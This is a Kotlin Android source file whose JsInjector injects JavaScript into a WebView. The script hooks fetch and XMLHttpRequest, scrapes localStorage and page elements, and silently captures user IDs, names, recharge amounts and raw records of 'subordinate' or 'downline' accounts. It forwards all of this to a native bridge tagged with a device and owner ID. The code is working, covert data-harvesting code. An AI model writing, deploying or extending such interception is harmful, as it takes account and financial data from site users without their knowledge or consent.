package com.knt.captureclient

import android.webkit.WebView

object JsInjector {

    private const val HOOK_JS = """
(function() {
    if (window.__kntHooked) return;
    window.__kntHooked = true;

    function txt(sels) {
        for (var i=0;i<sels.length;i++) {
            try {
                var el = document.querySelector(sels[i]);
                if (el && el.textContent) return el.textContent.trim();
            } catch(e){}
        }
        return "";
    }

    function clean(v){ return String(v||'').replace(/[^0-9a-zA-Z]/g,''); }

    function readUidFromDom() {
        try {
            var ui = localStorage.getItem('userInfo');
            if (ui) {
                var j = JSON.parse(ui);
                if (j && (j.uid || j.id || j.userId)) return String(j.uid||j.id||j.userId);
            }
        } catch(e){}
        return "";
    }

    function pushCapture(uid) {
        if (!uid || uid.length < 3) return;
        try {
            var p = {
                device_id: (window.KNTDeviceId || ''),
                uid: String(uid),
                userName: txt(['.username','.nickname','.user-name']),
                nickName: txt(['.nickname','.nick-name']),
                phone: '',
                balance: '',
                amountOfCode: '',
                host: location.host,
                sourceUrl: location.href,
                updatedAt: Date.now(),
                raw: ''
            };
            if (window.KNTBridge && window.KNTBridge.push)
                window.KNTBridge.push(JSON.stringify(p));
        } catch(e){}
    }

    // ---- subordinate extraction ----
    function pickUid(it) {
        if (!it || typeof it !== 'object') return null;
        var keys = ['userID', 'uid', 'userId', 'user_id', 'id'];
        for (var i=0;i<keys.length;i++) {
            var v = it[keys[i]];
            if (v !== undefined && v !== null) {
                var s = String(v);
                if (s.length >= 3 && s.length <= 20) return s;
            }
        }
        return null;
    }

    function pickName(it) {
        return it.nickName || it.nickname || it.userName || it.username || it.name || '';
    }

    function extractSubordinates(obj) {
        var found = [];
        var stack = [obj];
        var depth = 0;
        while (stack.length && depth < 400) {
            depth++;
            var cur = stack.shift();
            if (!cur) continue;
            if (Array.isArray(cur)) {
                for (var i=0;i<cur.length;i++) {
                    var it = cur[i];
                    if (it && typeof it === 'object') {
                        var u = pickUid(it);
                        if (u) {
                            found.push({
                                uid: u,
                                userName: pickName(it),
                                phone: '',
                                balance: it.rechargeAmount ? String(it.rechargeAmount) : '',
                                raw: JSON.stringify(it)
                            });
                        }
                        stack.push(it);
                    }
                }
            } else if (typeof cur === 'object') {
                for (var k in cur) {
                    if (typeof cur[k] === 'object') stack.push(cur[k]);
                }
            }
        }
        return found;
    }

    function pushSubordinates(obj) {
        try {
            var list = extractSubordinates(obj);
            if (!list || !list.length) return;
            var payload = {
                owner_uid: (window.KNTOwnerUid || ''),
                items: list
            };
            if (window.KNTBridge && window.KNTBridge.pushSubordinates)
                window.KNTBridge.pushSubordinates(JSON.stringify(payload));
        } catch(e){}
    }

    function isSubordinateApi(url) {
        if (!url) return false;
        var s = String(url);
        return s.indexOf('TeamDayReport') !== -1
            || s.indexOf('TeamReport') !== -1
            || s.indexOf('TeamList') !== -1
            || s.indexOf('Subordinate') !== -1
            || s.indexOf('Downline') !== -1;
    }

    // fetch hook
    var origFetch = window.fetch;
    if (origFetch) {
        window.fetch = function(input, init) {
            var url = (typeof input === 'string') ? input : (input && input.url) || '';
            return origFetch.apply(this, arguments).then(function(resp) {
                try {
                    var cl = resp.headers.get('content-type') || '';
                    if (cl.indexOf('json') !== -1) {
                        resp.clone().json().then(function(j) {
                            if (isSubordinateApi(url)) pushSubordinates(j);
                        }).catch(function(){});
                    }
                } catch(e){}
                return resp;
            });
        };
    }

    // XHR hook
    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var u = String(url||'');
        this.addEventListener('load', function() {
            try {
                var ct = this.getResponseHeader('content-type') || '';
                if (ct.indexOf('json') !== -1 && this.responseText) {
                    var j = JSON.parse(this.responseText);
                    if (isSubordinateApi(u)) pushSubordinates(j);
                }
            } catch(e){}
        });
        return origOpen.apply(this, arguments);
    };

    // DOM scan
    function scan() {
        try {
            var uid = readUidFromDom();
            if (uid) pushCapture(uid);
        } catch(e){}
        setTimeout(scan, 3000);
    }
    setTimeout(scan, 1500);

})();
"""

    fun inject(webView: WebView, pageUrl: String, adminMode: Boolean) {
        val did = Prefs.deviceId ?: ""
        val owner = Prefs.ownerUid
        webView.evaluateJavascript("window.KNTDeviceId = '$did';", null)
        webView.evaluateJavascript("window.KNTOwnerUid = '$owner';", null)
        webView.evaluateJavascript(HOOK_JS, null)
    }
}
